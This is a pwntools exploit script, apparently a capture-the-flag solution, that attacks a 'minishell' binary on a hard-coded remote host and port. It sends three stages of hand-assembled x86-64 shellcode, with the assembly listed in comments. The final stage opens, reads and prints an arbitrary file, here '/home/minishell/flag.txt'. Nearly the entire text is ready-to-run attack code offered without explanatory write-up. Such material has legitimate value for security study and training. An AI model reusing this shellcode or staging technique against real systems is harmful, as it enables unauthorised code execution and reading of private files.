#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('minishell')

host = args.HOST or '200.136.252.34'
port = int(args.PORT or 4545)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x555555554cde
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

"""
mov al,10
mov dl,0xf
syscall
push rcx
pop rsi
push rax
pop rdi
syscall
"""
stage1 = "\xB0\x0A\xB2\x0F\x0F\x05\x51\x5E\x50\x5F\x0F\x05"

io.recvuntil('?')
io.send(stage1)

"""
6 nop padding
xor ax,ax
mov edx, 154
syscall
"""
stage2 = "\x90" * 6 + "\x30\xC0\xBA\x9A\x00\x00\x00\x0F\x05"
io.send(stage2)

"""
a little padding
# read the filename to open
xor rax,rax
xor rdi,rdi
mov rsi,rsp
mov rdx,0xff
syscall

# open the file (fd is in rax)
mov rax,2
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
syscall

# read the file (read size is in rax)
mov rdi,rax
xor rax,rax
mov rsi,rsp
mov rdx,0xff
syscall

# write the flag and '\n'
mov rdx,rax
mov rax,1
mov rdi,1
mov rsi,rsp
syscall

push 0xa
mov rdx,1
mov rax,1
mov rdi,1
mov rsi,rsp
syscall
"""
stage3 = "\x90" * 49 + "\x90" + "\x48\x31\xC0\x48\x31\xFF\x48\x89\xE6\x48\xC7\xC2\xFF\x00\x00\x00\x0F\x05\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05\x48\x89\xC7\x48\x31\xC0\x48\x89\xE6\x48\xC7\xC2\xFF\x00\x00\x00\x0F\x05\x48\x89\xC2\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x0F\x05\x6A\x0A\x48\xC7\xC2\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x0F\x05"
io.send(stage3)
io.send('/home/minishell/flag.txt\x00')
#io.send('flag.txt\x00')
#io.send('/proc/12136/cwd/\x00')

io.interactive()

